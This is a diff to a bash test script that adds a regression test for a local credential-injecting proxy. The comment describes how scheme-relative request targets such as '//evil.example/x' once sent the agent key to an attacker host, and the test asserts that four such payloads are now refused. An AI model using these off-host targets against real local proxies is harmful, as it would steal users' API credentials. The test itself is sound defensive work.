@@ -690,5 +690,49 @@ save_agent_key() {
 }
 save_agent_key
 
+# ── PROXYPATH-H1: the proxy must never forward the agent key off-host ────────
+#
+# The request-target is attacker-controlled — any web page you visit can reach
+# 127.0.0.1:11434, which has no inbound auth and a predictable port. WHATWG URL
+# resolution lets a scheme-relative target replace the host, and the credential
+# is attached after resolution, so `//evil.example/x` exfiltrated
+# `agent_id:ocv_…`. --path-as-is stops curl normalising the target away before
+# it reaches us, which is the whole point.
+proxy_refuses_offhost_targets() {
+  local here; here="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+  PORT=4599 node "$here/echo-upstream.mjs" >/tmp/1claw-echo-pp.log 2>&1 &
+  local echo_pid=$!
+  $CLI proxy --agent-key "00000000-0000-0000-0000-000000000001:ocv_test_key" \
+    --shroud-url http://127.0.0.1:4599 --port 4171 >/tmp/1claw-pp.log 2>&1 &
+  local proxy_pid=$!
+  for i in $(seq 1 40); do
+    curl -sf -o /dev/null http://127.0.0.1:4171/health && break; sleep 0.25
+  done
+
+  local t code
+  for t in "//evil.example/x" "/\\evil.example/y" "///evil.example/w" "//evil.example"; do
+    code=$(curl -s -o /tmp/pp_out.json -w "%{http_code}" --path-as-is \
+           -X POST "http://127.0.0.1:4171$t" \
+           -H "Content-Type: application/json" -d '{"model":"gpt-4o"}')
+    if [[ "$code" == "400" ]] && grep -qE "invalid_request_target|upstream_origin_mismatch" /tmp/pp_out.json; then
+      PASSED=$((PASSED+1)); echo "  PASS proxypath: $t refused"
+    else
+      FAILED=$((FAILED+1)); echo "  FAIL proxypath: $t → HTTP $code $(head -c 120 /tmp/pp_out.json)"
+    fi
+  done
+
+  local out
+  out=$(curl -s -X POST http://127.0.0.1:4171/v1/chat/completions \
+        -H "Content-Type: application/json" -d '{"model":"gpt-4o"}')
+  if grep -q '"path":"/v1/chat/completions"' <<<"$out"; then
+    PASSED=$((PASSED+1)); echo "  PASS proxypath: a normal path still forwards"
+  else
+    FAILED=$((FAILED+1)); echo "  FAIL proxypath normal path: $(head -c 120 <<<"$out")"
+  fi
+
+  kill $proxy_pid $echo_pid 2>/dev/null || true
+}
+proxy_refuses_offhost_targets
+
 echo "=== Summary: $PASSED passed, $FAILED failed ==="
 [[ $FAILED -eq 0 ]]
